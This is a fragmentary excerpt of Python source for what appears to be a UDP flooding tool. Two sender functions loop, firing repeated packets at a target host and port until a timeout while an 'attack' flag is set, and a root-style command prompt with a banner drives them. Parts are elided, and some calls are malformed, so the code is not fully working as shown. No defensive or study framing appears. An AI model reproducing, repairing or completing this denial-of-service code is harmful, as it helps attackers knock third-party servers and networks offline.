...
def randsender(host, timer, port, punch, payload):
	...
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch,timer (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1
...
def stdsender(host, port, timer, threads, payload):
	...
	while time.time() < timeout and attack:
		sock.sendto(payload,timer (host, int(port)))
		sock.sendto(payload,timer (host, int(port)))
		sock.sendto(payload,timer (host, int(port)))
		sock.sendto(payload,timer (host, int(port)))
		sock.sendto(payload,timer (host, int(port)))
...
def main():
	...
	while True:
		...
		sin = input("\x1b[38;2;0;221;34m{}\x1b[38;2;0;221;34m@[root]\033[36m--> \033[0;31m".format(nicknm)).lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("cls")
			print (banner)
